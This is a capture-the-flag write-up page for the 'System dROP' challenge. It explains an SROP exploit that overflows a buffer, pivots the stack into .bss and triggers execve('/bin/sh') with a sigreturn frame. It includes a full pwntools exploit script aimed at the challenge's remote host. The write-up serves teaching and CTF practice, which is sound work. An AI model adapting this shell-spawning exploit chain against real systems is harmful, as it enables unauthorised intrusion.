@@ -1,0 +1,176 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>System dROP Writeup</h1>
+            <h2>April 2021</h2>
+            <h3>SROP</h3>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+       In the dark night, we managed to sneak in the plant that manages all the resources. Ready to deploy our root-kit and stop this endless draining of our planet, we accidentally triggered the alarm! Acid started raining from the ceiling, destroying almost everything but us and small terminal-like console. We can see no output, but it still seems to work, somehow.. <a href=../../docs/cyber_apocalypse/system_drop>System dROP</a>
+    	<br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br>
+    	The binary itself is very simple. It calls alarm and then reads in 0x100 bytes. It also has a syscall function. This fact alongside the title hints that we should solve this challenge using SROP, a rop technique that is especially useful when a syscall gadget exists, but not many other gadgets exist to set relevant registers. 
+        <br> 
+        As for protections, we have to deal with NX, partial relro and aslr. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/system_drop1.png" alt="">
+</div>
+
+<div class="paragraph">
+    <p>
+        <br><br>
+        Lets summarize what we need to successfuly perform an srop attack. First we need to save '/bin/sh' into a non randomized place in memory since it is not contained within the binary. Next we need to set rax to 0xf which is the syscall number of sigreturn. After calling sigreturn, we can then fill up the next ~200 bytes to populate sigreturns frame and set the appropriate registers before executing a final execve syscall to spawn a shell.
+        <br>
+        There is however one issue with this, since the initial read is only 256 bytes, we will have to trigger another read to read in enough bytes to save the sigreturn frame on the stack.  
+        <br><br>
+    </p>
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        The first part of our exploit will be the following payload. We pop an address from the bss section into rsi, and then use read to save the '/bin/sh' string to that address. 
+        <br> 
+        Next we pop a different address from the bss section into rsi, and call read again to read in our srop chain into the bss section. We also overwrite rbp with this address (buf variable), and then use a leave gadget to pivot the stack into the bss section to our remaining chain.
+        <br><br>
+    </p>
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+payload = 'A'*32 + buf + pop_rsi + binsh + 'A'*8 + read 
+payload += pop_rsi + buf + A'*8 + read + leave 
+        </code>
+    </pre>
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        The second part of our exploit will contain the SROP chain used to spawn a shell. First we pop 0xf into rdi, and then call alarm twice. This will cause the second alarm to return 0xf, which sets rax to 0xf. We can then use a syscall gadget to execute the sigreturn, at which point we set our gadgets to the correct values using pwntools' frame functionality. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+syscall = p64(0x40053b)
+frame = SigreturnFrame()
+frame.rip = 0x40053b
+frame.rax = 0x3b
+frame.rdi = 0x601048
+frame.rdx = 0x0
+frame.rsi = 0x0
+
+chain = 'A'*8 + pop_rdi + p64(0xf) + alarm + alarm + syscall + str(frame)
+        </code>
+    </pre>
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        After setting everything up as explained above, executing our exploit spawns a shell, allowing us to retrieve the flag.
+        <br>
+        The final exploit is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/system_drop2.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+import time
+
+from pwn import *
+elf = context.binary = ELF('./system_drop')
+libc = elf.libc
+
+local = False
+
+if local:
+    p = elf.process()
+else:
+    host = '188.166.172.13'
+    port = 30800
+    p = remote(host,port)
+
+syscall = p64(0x40053b)
+frame = SigreturnFrame()
+frame.rip = 0x40053b
+frame.rax = 0x3b
+frame.rdi = 0x601048
+frame.rdx = 0x0
+frame.rsi = 0x0
+
+t = 'C'*8
+pop_rdi = p64(0x4005d3)
+pop_rsi = p64(0x4005d1)
+alarm = p64(0x400430)
+binsh = p64(0x601048)
+buf = p64(0x601058)
+read = p64(0x400440)
+leave = p64(0x40056e)
+
+payload = 'A'*32 + buf + pop_rsi + binsh + t + read + pop_rsi + buf + t + read + leave
+chain = t + pop_rdi + p64(0xf) + alarm + alarm + syscall + str(frame)
+
+
+p.sendline(payload)
+
+raw_input()
+p.sendline("/bin/sh\x00")
+
+raw_input()
+p.sendline(chain)
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
